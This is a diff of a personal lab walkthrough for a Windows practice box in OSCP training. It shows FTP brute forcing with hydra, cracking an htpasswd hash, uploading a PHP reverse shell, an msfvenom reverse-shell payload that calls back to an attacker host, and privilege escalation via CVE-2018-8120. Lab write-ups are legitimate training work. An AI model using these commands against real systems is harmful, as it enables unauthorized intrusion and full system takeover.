@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-25
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Intermediate
@@ -141,49 +142,49 @@ PORT     STATE SERVICE            VERSION
 # Enumeration
 ## Port 21 - FTP (zFTPServer 6.0)
 - Ran `ftp 192.168.171.46` and used username `anonymous`
-![[Pasted image 20241025194245.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025194245.png]]
 - Change directory to `accounts` and identified three `uac` accounts including `admin` and `Offsec`
-![[Pasted image 20241025194448.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025194448.png]]
 - Navigated to `/` directory and unsuccessfully attempted to run `get settings.ini`
-![[Pasted image 20241025194627.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025194627.png]]
 - Exited ftp login, and ran `hydra 192.168.171.46 ftp -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` to brute force other logins - identified credentials `admin:admin` `anonymous:anonymous` `Admin:admin`
-![[Pasted image 20241025201654.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025201654.png]]
 - Ran `ftp 192.168.171.46` with credentials `admin:admin` and identified three available files
-![[Pasted image 20241025201910.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025201910.png]]
 - Used `get` to download all three files and inspected individually. 
 	- Ran `cat index.php` - identified a quote from Plautus
-![[Pasted image 20241025202406.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025202406.png]]
 	- Ran `cat .htaccess`
-![[Pasted image 20241025202537.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025202537.png]]
 	- Ran `cat .htpasswd` - identified password hash for user `offsec:offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0`
-![[Pasted image 20241025202711.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025202711.png]]
 - Saved `offsec:offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0` as `offsec.hash` and ran `john offsec.hash` to crack password hash - identified credentials `offsec:elite`
-![[Pasted image 20241025203051.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025203051.png]]
 ## Port 242 - HTTP (Apache/2.2.21)
 - Navigated to `http://192.168.171.46:242` and identified web login
-![[Pasted image 20241025201023.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025201023.png]]
 - Attempted password guessing with `admin:admin`, `root:root`, `admin:password` - unsuccessful.
 - Attempted login with cracked credentials `offsec:elite` and accessed page
-![[Pasted image 20241025203334.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025203334.png]]
 ## Port 3389 - RDP 
 - Attempted login with cracked credentials `offsec:elite` - unsuccessful
-![[Pasted image 20241025203610.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025203610.png]]
 
 ---
 # Exploitation
 - Created `shell.php` with reverse shell back to Kali host
-![[Pasted image 20241025204143.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025204143.png]]
 - Ran `put shell.php` on `ftp` service as `admin` to upload reverse shell
-![[Pasted image 20241025204306.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025204306.png]]
 - Started netcat listener on port `1234` with `nc -nvlp 1234` then used web browser to navigate to `http://192.168.171.46:242/shell.php`, and received reverse shell
-![[Pasted image 20241025204007.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025204007.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Navigated to `C:\Users\apache\Desktop` and ran `type local.txt` to print `98e8a3c01c8d7944c46cf806438ed074`
-![[Pasted image 20241025204654.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025204654.png]]
 - Ran `systeminfo` to get host details, and identified OS Name `Microsoftr Windows Serverr 2008 Standard` with system-type `x86` architecture - OS is vulnerable to CVE-2018-8120
-![[Pasted image 20241025220625.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241025220625.png]]
 ---
 # Privilege Escalation
 ## CVE-2018-8120
@@ -191,9 +192,9 @@ PORT     STATE SERVICE            VERSION
 - Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=80 -f exe > reverse.exe`
 - Uploaded `x86.exe` & `reverse.exe` to target via `FTP` while logged in as `admin:admin`
 - Started netcat listener on port `80`, then returned to reverse shell and ran `x86.exe reverse.exe`
-![[Pasted image 20241026183414.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241026183414.png]]
 - Checked reverse shell and found incoming connection
-![[Pasted image 20241026183445.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241026183445.png]]
 - Navigated to `C:\Users\Administrator\Desktop` and ran `type proof.txt` to print `fb1863d6c3980a8502ac04794d08b5a4`
 
 ---
